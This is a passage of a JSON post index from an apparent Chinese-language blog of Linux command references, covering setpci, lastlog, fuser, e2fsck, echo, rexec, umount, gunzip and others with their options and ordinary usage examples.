","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"logwatch","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/logwatch/","stats":{"text":"3 min read","time":125000,"words":544,"minutes":3},"date":"2022-02-02 14:18:02","dateFormat":"2022-02-02"},{"content":"查询和配置 PCI 设备的使用工具。 补充说明 setpci 命令是一个查询和配置 PCI 设备的使用工具。 语法 setpci (选项) (参数) 选项 -v：显示指令执行的细节信息； -f：当没有任何操作需要完成时，不显示任何信息； -D：测试模式，并不真正将配置信息写入寄存器； -d：仅显示给定厂商和设备的信息； -s：仅显示指定总线、插槽上的设备或设备上的功能块信息。 参数 PCI 设备：指定要配置的 PCI 设备； 操作：指定要完成的配置操作。 实例 Linux 下调节笔记本屏幕亮度方法： 首先进入终端输入 lspci 命令，列出各种设备的地址： lspci 00:00.0 host bridge: Intel Corporation Mobile 945GM/PM/GMS, 943/940GML and 945GT Express Memory Controller Hub (rev 03) 00:02.0 VGA compatible controller: Intel Corporation Mobile 945GM/GMS, 943/940GML Express Integrated Graphics Controller (rev 03) 00:02.1 Display controller: Intel Corporation Mobile 945GM/GMS/GME, 943/940GML Express Integrated Graphics Controller (rev 03) 00:1b.0 Audio device: Intel Corporation N10/ICH 7 Family High Definition Audio Controller (rev 02) 00:1c.0 PCI bridge: Intel Corporation N10/ICH 7 Family PCI Express Port 1 (rev 02) 00:1c.1 PCI bridge: Intel Corporation N10/ICH 7 Family PCI Express Port 2 (rev 02) ...... 发现 00:02.0 是 VGA 设备，于是我们修改它的属性： sudo setpci -s 00:02.0 F4.B=FF 解释一下： setpci 是修改设备属性的命令。 -s 表示接下来输入的是设备的地址。 00:02.0 VGA 设备地址（&lt;总线&gt;:&lt;接口&gt;.&lt;功能&gt;）。 F4 要修改的属性的地址，这里应该表示“亮度”。 .B 修改的长度（B 应该是字节（Byte），还有 w（应该是 Word，两个字节）、L（应该是 Long，4 个字节））。 =FF 要修改的值（可以改）。 我这里 00 是最暗，FF 是最亮，不同的电脑可能不一样。比如说我嫌 FF 太闪眼了，我就可以： sudo setpci -s 00:02.0 F4.B=CC ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"setpci","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/setpci/","stats":{"text":"3 min read","time":127000,"words":488,"minutes":3},"date":"2022-02-02 14:17:42","dateFormat":"2022-02-02"},{"content":"显示系统中所有用户最近一次登录信息。 补充说明 lastlog 命令用于显示系统中所有用户最近一次登录信息。 lastlog 文件在每次有用户登录时被查询。可以使用 lastlog 命令检查某特定用户上次登录的时间，并格式化输出上次登录日志/var/log/lastlog的内容。它根据 UID 排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog 显示**Never logged**。注意需要以 root 身份运行该命令。 语法 lastlog (选项) 选项 -b&lt;天数&gt;：显示指定天数前的登录信息； -h：显示召集令的帮助信息； -t&lt;天数&gt;：显示指定天数以来的登录信息； -u&lt;用户名&gt;：显示指定用户的最近登录信息。 实例 lastlog Username Port From Latest root pts/0 221.6.45.34 Tue Dec 17 09:40:48 +0800 2013 bin **Never logged in** daemon **Never logged in** adm **Never logged in** lp **Never logged in** sync **Never logged in** shutdown **Never logged in** halt **Never logged in** mail **Never logged in** news **Never logged in** uucp **Never logged in** operator **Never logged in** games **Never logged in** gopher **Never logged in** ftp **Never logged in** nobody **Never logged in** vcsa **Never logged in** ntp **Never logged in** sshd **Never logged in** nscd **Never logged in** ldap **Never logged in** postfix **Never logged in** www **Never logged in** mysql **Never logged in** ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lastlog","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lastlog/","stats":{"text":"2 min read","time":90000,"words":334,"minutes":2},"date":"2022-02-02 14:17:16","dateFormat":"2022-02-02"},{"content":"使用文件或文件结构识别进程。 补充说明 fuser 命令用于报告进程使用的文件和网络套接字。fuser 命令列出了本地进程的进程号，那些本地进程使用 file，参数指定的本地或远程文件。对于阻塞特别设备，此命令列出了使用该设备上任何文件的进程。 每个进程号后面都跟随一个字母，该字母指示进程如何使用文件。 c ：指示进程的工作目录。 e ：指示该文件为进程的可执行文件 (即进程由该文件拉起)。 f ：指示该文件被进程打开，默认情况下 f 字符不显示。 F ：指示该文件被进程打开进行写入，默认情况下 F 字符不显示。 r ：指示该目录为进程的根目录。 m ：指示进程使用该文件进行内存映射，抑或该文件为共享库文件，被进程映射进内存。 语法 fuser (选项) (参数) 选项 -a：显示命令行中指定的所有文件； -k：杀死访问指定文件的所有进程； -i：杀死进程前需要用户进行确认； -l：列出所有已知信号名； -m：指定一个被加载的文件系统或一个被加载的块设备； -n：选择不同的名称空间； -u：在每个进程后显示所属的用户名。 参数 文件：可以是文件名或者 TCP、UDP 端口号。 实例 要列出使用/etc/passwd文件的本地进程的进程号，请输入： fuser /etc/passwd 要列出使用/etc/filesystems文件的进程的进程号和用户登录名，请输入： fuser -u /etc/filesystems 要终止使用给定文件系统的所有进程，请输入： fuser -k -x -u -c /dev/hd1 或者 fuser -kxuc /home 任一命令都列出了进程号和用户名，然后终止每个正在使用/dev/hd1 (/home)文件系统的进程。仅有 root 用户能终止属于另一用户的进程。如果您正在试图卸下/dev/hd1文件系统，而一个正在访问/dev/hd1文件系统的进程不允许这样，您可能希望使用此命令。 要列出正在使用已从给定文件系统删除的文件的全部进程，请输入： fuser -d /usr 文件 /dev/kmem 用于系统映像。/dev/mem 也用于系统映像。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fuser","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fuser/","stats":{"text":"3 min read","time":133000,"words":616,"minutes":3},"date":"2022-02-02 14:16:58","dateFormat":"2022-02-02"},{"content":"用于检查第二扩展文件系统的完整性。 补充说明 e2fsck 命令用于检查第二扩展文件系统的完整性，通过适当的选项可以尝试修复出现的错误。 e2fsck 执行后的传回值及代表意义如下： 0 没有任何错误发生。 1 文件系统发生错误，并且已经修正。 2 文件系统发生错误，并且已经修正。 4 文件系统发生错误，但没有修正。 8 运作时发生错误。 16 使用的语法发生错误。 128 共享的函数库发生错误。 语法 e2fsck (选项) (参数) 选项 -a：不询问使用者意见，便自动修复文件系统； -b&lt;superblock&gt;：指定 superblock，而不使用预设的 superblock； -B&lt;区块大小&gt;：指定区块的大小，单位为字节； -c：一并执行 badblocks，以标示损坏的区块； -C：将检查过程的信息完整记录在 file descriptor 中，使得整个检查过程都能完整监控； -d：显示排错信息； -f：即使文件系统没有错误迹象，仍强制地检查正确性； -F：执行前先清除设备的缓冲区； -l&lt;文件&gt;：将文件中指定的区块加到损坏区块列表； -L&lt;文件&gt;：先清除损坏区块列表，再将文件中指定的区块加到损坏区块列表。因此损坏区块列表的区块跟文件中指定的区块是一样的； -n：以只读模式开启文件系统，并采取非互动方式执行，所有的问题对话均设置以&quot;no&quot;回答； -p：不询问使用者意见，便自动修复文件系统； -r：此参数只为了兼容性而存在，并无实际作用； -s：如果文件系统的字节顺序不适当，就交换字节顺序，否则不做任何动作； -S：不管文件系统的字节顺序，一律交换字节顺序； -t：显示时间信息； -v：执行时显示详细的信息； -V：显示版本信息； -y：采取非互动方式执行，所有的问题均设置以&quot;yes&quot;回答。 参数 文件系统或者分区：指定文件系统或者分区所对应的设备文件名。 实例 检查/dev/sda1是否有问题，如发现问题便自动修复： e2fsck -a -y /dev/sda1 执行 e2fsck 或 fsck 前请先 umount partition，否则有机会令档案系统毁损。如果需要对根目录/进行检查及修复，便需要进入 singal user mode 执行。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"e2fsck","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/e2fsck/","stats":{"text":"3 min read","time":142000,"words":656,"minutes":3},"date":"2022-02-02 14:16:25","dateFormat":"2022-02-02"},{"content":"显示有关 CPU 架构的信息。 补充说明 lscpu 命令是显示有关 CPU 架构的信息。 语法 lscpu [选项 ] 选项 -a, --all # 打印在线和离线CPU（默认为-e） -b, --online # 仅打印在线CPU（-p的默认值） -c, --offline # 打印离线CPU -e, --extended[=&lt;list&gt;] # 打印出一个扩展的可读格式 -p, --parse[=&lt;list&gt;] # 打印出可解析的格式 -s, --sysroot &lt;dir&gt; # 将指定的目录用作系统根目录 -x, --hex # 打印十六进制掩码，而不是CPU列表 -h, --help # 显示此帮助并退出 -V, --version # 输出版本信息并退出 参数 可用列： CPU 逻辑CPU编号 CORE 逻辑核心号码 SOCKET 逻辑套接字号 NODE 逻辑NUMA节点号 BOOK 逻辑书号 CACHE 显示了如何在CPU之间共享高速缓存 POLARIZATION 虚拟硬件上的CPU调度模式 ADDRESS CPU的物理地址 CONFIGURED 显示管理程序是否分配了CPU ONLINE 显示Linux是否正在使用CPU 例子 [root@localhost ~]# lscpu Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian CPU(s): 4 On-line CPU(s) list: 0-3 Thread(s) per core: 1 Core(s) per socket: 4 Socket(s): 1 NUMA node(s): 1 Vendor ID: GenuineIntel CPU family: 6 Model: 30 Model name: Intel(R) Xeon(R) CPU X3430 @ 2.40GHz Stepping: 5 CPU MHz: 2394.055 BogoMIPS: 4788.11 Virtualization: VT-x L1d cache: 32K L1i cache: 32K L2 cache: 256K L3 cache: 8192K NUMA node0 CPU(s): 0-3 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lscpu","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lscpu/","stats":{"text":"2 min read","time":94000,"words":344,"minutes":2},"date":"2022-02-02 14:15:09","dateFormat":"2022-02-02"},{"content":"压缩或解压缩 lzh 格式文件。 补充说明 lha 命令是从 lharc 演变而来的压缩程序，文件经它压缩后，会另外产生具有.lzh扩展名的压缩文件。 选项 -a 或 a：压缩文件，并加入到压缩文件内。-a&lt;0/1/2&gt;/u&lt;/0/1/2&gt; 压缩文件时，采用不同的文件头。-c 或 c：压缩文件，重新建构新的压缩文件后，再将其加入。-d 或 d：从压缩文件内删除指定的文件。-&lt;a/c/u&gt;d 或&lt;a/c/u&gt;d：压缩文件，然后将其加入，重新建构，更新压缩文件或，删除原始文件，也就是把文件移到压缩文件中。-e 或 e：解开压缩文件。-f 或 f：强制执行 lha 命令，在解压时会直接覆盖已有的文件而不加以询问。-g 或 g：使用通用的压缩格式，便于解决兼容性的问题。-&lt;e/x&gt;i 或&lt;e/x&gt;i：解开压缩文件时，忽略保存在压缩文件内的文件路径，直接将其解压后存放在现行目录下或是指定的目录中。-l 或 l：列出压缩文件的相关信息。-m 或 m：此选项的效果和同时指定&quot;-ad&quot;选项相同。-n 或 n：不执行指令，仅列出实际执行会进行的动作。-&lt;a/u&gt;o 或&lt;a/u&gt;o：采用 lharc 兼容格式，将压缩后的文件加入，更新压缩文件。-p 或 p：从压缩文件内输出到标准输出设备。-q 或 q：不显示指令执行过程。-t 或 t：检查备份文件内的每个文件是否正确无误。-u 或 u：更换较新的文件到压缩文件内。-u&lt;/0/1/2&gt;或 u&lt;/0/1/2&gt;：在文件压缩时采用不同的文件头，然后更新到压缩文件内。-v 或 v：详细列出压缩文件的相关信息。-&lt;e/x&gt;w=&lt;目的目录&gt;或&lt;e/x&gt;w=&lt;目的目录&gt;：指定解压缩的目录。-x 或 x：解开压缩文件。-&lt;a/u&gt;z 或&lt;a/u&gt;z：不压缩文件，直接把它加入，更新压缩文件。 实例 lha -a abc.lhz a.b #压缩a.b文件，压缩后生成 abc.lhz 文件 lha -a abc2 /home/hnlinux #压缩目录 lha -xiw=agis abc #解压文件abc，到当前目录 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lha","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lha/","stats":{"text":"3 min read","time":149000,"words":628,"minutes":3},"date":"2022-02-02 14:14:50","dateFormat":"2022-02-02"},{"content":"输出指定的字符串或者变量。 补充说明 echo 命令用于在 shell 中打印 shell 变量的值，或者直接输出指定的字符串。linux 的 echo 命令，在 shell 编程中极为常用, 在终端下打印变量 value 的时候也是常常用到的，因此有必要了解下 echo 的用法 echo 命令的功能是在显示器上显示一段文字，一般起到一个提示的作用。 语法 echo (选项) (参数) 选项 -e：激活转义字符。 使用-e选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出： \\a 发出警告声； \\b 删除前一个字符； \\c 不产生进一步输出 (\\c 后面的字符不会输出)； \\f 换行但光标仍旧停留在原来的位置； \\n 换行且光标移至行首； \\r 光标移至行首，但不换行； \\t 插入 tab； \\v 与\\f 相同； \\\\ 插入\\字符； \\nnn 插入 nnn（八进制）所代表的 ASCII 字符； 参数 变量：指定要打印的变量。 实例 用 echo 命令打印带有色彩的文字： 文字色： echo -e &quot;\\e[1;31mThis is red text\\e[0m&quot; This is red text \\e[1;31m 将颜色设置为红色 \\e[0m 将颜色重新置回 颜色码：重置=0，黑色=30，红色=31，绿色=32，黄色=33，蓝色=34，洋红=35，青色=36，白色=37 背景色 ： echo -e &quot;\\e[1;42mGreed Background\\e[0m&quot; Greed Background 颜色码：重置=0，黑色=40，红色=41，绿色=42，黄色=43，蓝色=44，洋红=45，青色=46，白色=47 文字闪动： echo -e &quot;\\033[37;31;5mMySQL Server Stop...\\033[39;49;0m&quot; 红色数字处还有其他数字参数：0 关闭所有属性、1 设置高亮度（加粗）、4 下划线、5 闪烁、7 反显、8 消隐 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"echo","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/echo/","stats":{"text":"2 min read","time":110000,"words":467,"minutes":2},"date":"2022-02-02 14:13:06","dateFormat":"2022-02-02"},{"content":"列出目前与过去登入系统的用户相关信息。 补充说明 last 命令用于显示用户最近登录信息。单独执行 last 命令，它会读取/var/log/wtmp的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。 语法 last (选项) (参数) 选项 -a：把从何处登入系统的主机名称或 ip 地址，显示在最后一行； -d：将 IP 地址转换成主机名称； -f &lt;记录文件&gt;：指定记录文件。-n &lt;显示列数&gt;或-&lt;显示列数&gt;：设置列出名单的显示列数； -R：不显示登入系统的主机名称或 IP 地址； -x：显示系统关机，重新开机，以及执行等级的改变等信息。 参数 用户名：显示用户登录列表； 终端：显示从指定终端的登录列表。 实例 last 命令用了显示用户登录情况，以下是直接显示固定行数的记录： last -10 root pts/0 221.6.45.34 Tue Dec 17 09:40 still logged in root pts/0 221.6.45.34 Mon Dec 16 09:00 - 11:57 (02:56) root pts/0 222.94.97.122 Sun Dec 15 20:39 - 23:28 (02:48) root pts/0 222.95.209.80 Sat Dec 14 14:39 - 14:58 (00:18) root pts/0 221.6.45.34 Thu Dec 12 16:55 - 17:37 (00:41) root pts/0 49.65.139.195 Wed Dec 11 20:40 - 21:16 (00:35) root pts/0 49.65.139.195 Wed Dec 11 19:46 - 20:03 (00:17) root pts/0 221.6.45.34 Tue Dec 10 14:41 - 15:52 (01:10) root pts/0 221.6.45.34 Mon Dec 9 17:24 - 17:30 (00:06) root pts/0 221.6.45.34 Mon Dec 9 09:38 - 11:41 (02:02) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"last","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/last/","stats":{"text":"2 min read","time":116000,"words":422,"minutes":2},"date":"2022-02-02 14:12:46","dateFormat":"2022-02-02"},{"content":"显示文件十六进制格式。 补充说明 hexdump 命令一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。 语法 hexdump [选项 ] [文件 ]... 选项 -n length 只格式化输入文件的前length个字节。 -C 输出规范的十六进制和ASCII码。 -b 单字节八进制显示。 -c 单字节字符显示。 -d 双字节十进制显示。 -o 双字节八进制显示。 -x 双字节十六进制显示。 -s 从偏移量开始输出。 -e 指定格式字符串，格式字符串包含在一对单引号中，格式字符串形如：'a/b &quot;format1&quot; &quot;format2&quot;'。 每个格式字符串由三部分组成，每个由空格分隔，第一个形如 a/b，b 表示对每 b 个输入字节应用 format1 格式，a 表示对每 a 个输入字节应用 format2 格式，一般 a&gt;b，且 b 只能为 1，2，4，另外 a 可以省略，省略则 a=1。format1 和 format2 中可以使用类似 printf 的格式字符串，如： %02d：两位十进制 %03x：三位十六进制 %02o：两位八进制 %c：单个字符等 还有一些特殊的用法： %_ad：标记下一个输出字节的序号，用十进制表示。 %_ax：标记下一个输出字节的序号，用十六进制表示。 %_ao：标记下一个输出字节的序号，用八进制表示。 %_p：对不能以常规字符显示的用 . 代替。 同一行如果要显示多个格式字符串，则可以跟多个-e选项。 实例 hexdump -e '16/1 &quot;%02X &quot; &quot; | &quot;' -e '16/1 &quot;%_p&quot; &quot;\\n&quot;' test 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ................ 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F | ................ 20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F | !&quot;#$%&amp;'()*+,-./ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"hexdump","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/hexdump/","stats":{"text":"2 min read","time":119000,"words":490,"minutes":2},"date":"2022-02-02 14:11:33","dateFormat":"2022-02-02"},{"content":"运程执行 Linux 系统下命令。 补充说明 rexec 命令 用于在指定的远程 Linux 系统主机上执行命令，向远程 rexec 服务器发出执行命令的请求。 rexec 命令通过检查$HOME/.netrc文件（包含远程主机上使用的用户名和密码）来提供自动登录的功能。如果没有发现此类项或系统在安全方式下操作（参阅 securetcpip 命令），rexec 命令提示输入一个远程主机的有效用户名和密码。这两种情况下，rexec 均导致远程系统上的 rexecd 使用缺省的 compat 用户登录认证方法。rexecd 不会为了备用的认证方法去查找/etc/security/user文件。也可以指定-n标志到 rexec 命令行上来重设自动登录功能。 语法 rexec (选项) (参数) 选项 -a：表示远程命令的标准错误与标准输出相同，不支持发送任意信号到远程进程； -l&lt;用户名&gt;：指定连接远程 rexec 服务器的用户名； -p&lt;密码&gt;：指定连接远程 rexec 服务器的密码； -n：明确地提示输入用户名和密码。 参数 远程主机：指定远程主机（ip 地址或主机名）； 命令：指定需要在远程主机上执行的命令。 实例 要在一个远程主机上执行 date 命令，输入： rexec host1 date date 命令的输出现在显示在本地系统上。本示例中，在本地主机上的$HOME/.netrc文件包含远程主机上有效的用户名和密码。如果没有远程主机的$HOME/.netrc文件中的有效项，将提示输入登录标识和密码。输入所要求的登录信息后，date 命令的输出显示在本地系统上。 要重设自动登录功能并执行远程主机上的 date 命令，输入： rexec -nhost1 date 出现提示时输入用户名和密码，date 命令的输出现在显示在本地系统上。 列出远程主机上另一个用户的目录，输入： rexec host1 ls -l /home/karen 在远程主机 host1 上的 karen 用户的目录列表显示在本地系统上。 如果没有远程主机的$HOME/.netrc文件中的有效项，将提示您输入登录标识和密码。输入要求的登录信息后，在远程主机 host1 上的 karen 用户的目录列表显示在本地系统上。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rexec","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rexec/","stats":{"text":"3 min read","time":135000,"words":629,"minutes":3},"date":"2022-02-02 14:11:03","dateFormat":"2022-02-02"},{"content":"建立要载入 ramdisk 的映像文件。 补充说明 mkinitrd 命令建立要载入 ramdisk 的映像文件，以供 Linux 开机时载入 ramdisk。 这个是重新封包核心的命令，例如你自己修改了一个设备的驱动，如果这个驱动要加入核心级别的话，就需要对核心进行重新封包，把新加的配置编译到核心内部去！ 语法 mkinitrd (选项) (参数) 选项 -f：若指定的映像问家名称与现有文件重复，则覆盖现有的文件； -v：执行时显示详细的信息； --omit-scsi-modules：不要载入 SCSI 模块； --preload=&lt;模块名称&gt;：指定要载入的模块； --with=&lt;模块名称&gt;：指定要载入的模块； --version：显示版本信息。 参数 映像文件：指定要创建的映像文件； 内核版本：指定内核版本。 实例 [root@localhost tmp]# mkinitrd -v -f myinitrd.img $(uname -r) Creating initramfs WARNING: using /tmp for temporary files Looking for deps of module ide-disk Looking for deps of module ext3 jbd Looking for deps of module jbd Using modules: ./kernel/fs/jbd/jbd.ko ./kernel/fs/ext3/ext3.ko /sbin/nash -&gt; /tmp/initrd.Vz3928/bin/nash /sbin/insmod.static -&gt; /tmp/initrd.Vz3928/bin/insmod /sbin/udev.static -&gt; /tmp/initrd.Vz3928/sbin/udev /etc/udev/udev.conf -&gt; /tmp/initrd.Vz3928/etc/udev/udev.conf copy from /lib/modules/2.6.9-5.EL/./kernel/fs/jbd/jbd.ko(elf32-i386) to /tmp/initrd.Vz3928/lib/jbd.ko(elf32-i386) copy from /lib/modules/2.6.9-5.EL/./kernel/fs/ext3/ext3.ko(elf32-i386) to /tmp/initrd.Vz3928/lib/ext3.ko(elf32-i386) Loading module jbd Loading module ext3 [root@localhost tmp]# file myinitrd.img myinitrd.img: gzip compressed data, from Unix, max compression [root@localhost tmp]# mv myinitrd.img myinitrd.img.gz [root@localhost tmp]# gzip -d myinitrd.img.gz [root@localhost tmp]# file myinitrd.img myinitrd.img: ASCII cpio archive (SVR4 with no CRC) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mkinitrd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mkinitrd/","stats":{"text":"3 min read","time":120000,"words":418,"minutes":3},"date":"2022-02-02 14:09:09","dateFormat":"2022-02-02"},{"content":"查找二进制程序、代码等相关文件路径。 补充说明 whereis 命令用来定位指令的二进制程序、源代码文件和 man 手册页等相关文件的路径。 whereis 命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man 说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。 和 find 相比，whereis 查找的速度非常快，这是因为 linux 系统会将 系统内的所有文件都记录在一个数据库文件中，当使用 whereis 和下面即将介绍的 locate 时，会从数据库中查找数据，而不是像 find 命令那样，通 过遍历硬盘来查找，效率自然会很高。 但是该数据库文件并不是实时更新，默认情况下时一星期更新一次，因此，我们在用 whereis 和 locate 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。 语法 whereis (选项) (参数) 选项 -b：只查找二进制文件； -B&lt;目录&gt;：只在设置的目录下查找二进制文件； -f：不显示文件名前的路径名称； -m：只查找说明文件； -M&lt;目录&gt;：只在设置的目录下查找说明文件； -s：只查找原始代码文件； -S&lt;目录&gt;只在设置的目录下查找原始代码文件； -u：查找不包含指定类型的文件。 参数 指令名：要查找的二进制程序、源文件和 man 手册页的指令名。 实例 将相关的文件都查找出来 [root@localhost ~]# whereis tomcat tomcat: [root@localhost ~]# whereis svn svn: /usr/bin/svn /usr/local/svn /usr/share/man/man1/svn.1.gz 说明：tomcat 没安装，找不出来，svn 安装找出了很多相关文件 只将二进制文件查找出来 [root@localhost ~]# whereis -b svn svn: /usr/bin/svn /usr/local/svn [root@localhost ~]# whereis -m svn svn: /usr/share/man/man1/svn.1.gz [root@localhost ~]# whereis -s svn svn: 说明：whereis -m svn查出说明文档路径，whereis -s svn找 source 源文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"whereis","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/whereis/","stats":{"text":"3 min read","time":127000,"words":554,"minutes":3},"date":"2022-02-02 14:08:47","dateFormat":"2022-02-02"},{"content":"用于卸载已经加载的文件系统。 补充说明 umount 命令用于卸载已经加载的文件系统。利用设备名或挂载点都能 umount 文件系统，不过最好还是通过挂载点卸载，以免使用绑定挂载（一个设备，多个挂载点）时产生混乱。 语法 umount (选项) (参数) 选项 -a：卸除/etc/mtab 中记录的所有文件系统； -h：显示帮助； -n：卸除时不要将信息存入/etc/mtab 文件中； -r：若无法成功卸除，则尝试以只读的方式重新挂入文件系统； -t&lt;文件系统类型&gt;：仅卸除选项中所指定的文件系统； -v：执行时显示详细的信息； -V：显示版本信息。 参数 文件系统：指定要卸载的文件系统或者其对应的设备文件名。 实例 下面两条命令分别通过设备名和挂载点卸载文件系统，同时输出详细信息： 通过设备名卸载 umount -v /dev/sda1 /dev/sda1 umounted 通过挂载点卸载 umount -v /mnt/mymount/ /tmp/diskboot.img umounted 如果设备正忙，卸载即告失败。卸载失败的常见原因是，某个打开的 shell 当前目录为挂载点里的某个目录： umount -v /mnt/mymount/ umount: /mnt/mymount: device is busy umount: /mnt/mymount: device is busy 有时，导致设备忙的原因并不好找。碰到这种情况时，可以用 lsof 列出已打开文件，然后搜索列表查找待卸载的挂载点： lsof | grep mymount 查找mymount分区里打开的文件 bash 9341 francois cwd DIR 8,1 1024 2 /mnt/mymount 从上面的输出可知，mymount 分区无法卸载的原因在于，francois 运行的 PID 为 9341 的 bash 进程。 对付系统文件正忙的另一种方法是执行延迟卸载： umount -vl /mnt/mymount/ 执行延迟卸载 延迟卸载（lazy unmount）会立即卸载目录树里的文件系统，等到设备不再繁忙时才清理所有相关资源。卸载可移动存储介质还可以用 eject 命令。下面这条命令会卸载 cd 并弹出 CD： eject /dev/cdrom 卸载并弹出 CD ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"umount","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/umount/","stats":{"text":"3 min read","time":124000,"words":553,"minutes":3},"date":"2022-02-02 05:23:40","dateFormat":"2022-02-02"},{"content":"显示或设置 shell 特性及 shell 变量。 补充说明 set 命令作用主要是显示系统中已经存在的 shell 变量，以及设置 shell 变量的新变量值。使用 set 更改 shell 特性时，符号&quot;+&quot;和&quot;-&quot;的作用分别是打开和关闭指定的模式。set 命令不能够定义新的 shell 变量。如果要定义新的变量，可以使用 declare 命令以变量名=值的格式进行定义即可。 语法 set (选项) (参数) 选项 -a：标示已修改的变量，以供输出至环境变量。 -b：使被中止的后台程序立刻回报执行状态。 -C：转向所产生的文件无法覆盖已存在的文件。 -d：Shell预设会用杂凑表记忆使用过的指令，以加速指令的执行。使用-d参数可取消。 -e：若指令传回值不等于0，则立即退出shell。 -f：取消使用通配符。 -h：自动记录函数的所在位置。 -H Shell：可利用&quot;!&quot;加&lt;指令编号&gt;的方式来执行history中记录的指令。 -k：指令所给的参数都会被视为此指令的环境变量。 -l：记录for循环的变量名称。 -m：使用监视模式。 -n：只读取指令，而不实际执行。 -p：启动优先顺序模式。 -P：启动-P参数后，执行指令时，会以实际的文件或目录来取代符号连接。 -t：执行完随后的指令，即退出shell。 -u：当执行时使用到未定义过的变量，则显示错误信息。 -v：显示shell所读取的输入值。 -x：执行指令后，会先显示该指令及所下的参数。 参数 取消某个 set 曾启动的参数。 实例 使用 declare 命令定义一个新的环境变量&quot;mylove&quot;，并且将其值设置为&quot;Visual C++&quot;，输入如下命令： declare mylove='Visual C++' #定义新环境变量 再使用 set 命令将新定义的变量输出为环境变量，输入如下命令： set -a mylove #设置为环境变量 执行该命令后，将会新添加对应的环境变量。用户可以使用 env 命令和 grep 命令分别显示和搜索环境变量&quot;mylove&quot;，输入命令如下： env | grep mylove #显示环境变量值 此时，该命令执行后，将输出查询到的环境变量值。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"set","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/set/","stats":{"text":"3 min read","time":136000,"words":618,"minutes":3},"date":"2022-02-02 05:23:17","dateFormat":"2022-02-02"},{"content":"用来解压缩文件。 补充说明 gunzip 命令用来解压缩文件。gunzip 是个使用广泛的解压缩程序，它用于解开被 gzip 压缩过的文件，这些压缩文件预设最后的扩展名为.gz。事实上 gunzip 就是 gzip 的硬连接，因此不论是压缩或解压缩，都可通过 gzip 指令单独完成。 语法 gunzip (选项) (参数) 选项 -a 或——ascii：使用 ASCII 文字模式； -c 或--stdout 或--to-stdout：把解压后的文件输出到标准输出设备； -f 或-force：强行解开压缩文件，不理会文件名称或硬连接是否存在以及该文件是否为符号连接； -h 或——help：在线帮助； -l 或——list：列出压缩文件的相关信息； -L 或——license：显示版本与版权信息； -n 或--no-name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其忽略不予处理； -N 或——name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其回存到解开的文件上； -q 或——quiet：不显示警告信息； -r 或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理； -S 或&lt;压缩字尾字符串&gt;或----suffix&lt;压缩字尾字符串&gt;：更改压缩字尾字符串； -t 或——test：测试压缩文件是否正确无误； -v 或——verbose：显示指令执行过程； -V 或——version：显示版本信息； 参数 文件列表：指定要解压缩的压缩包。 实例 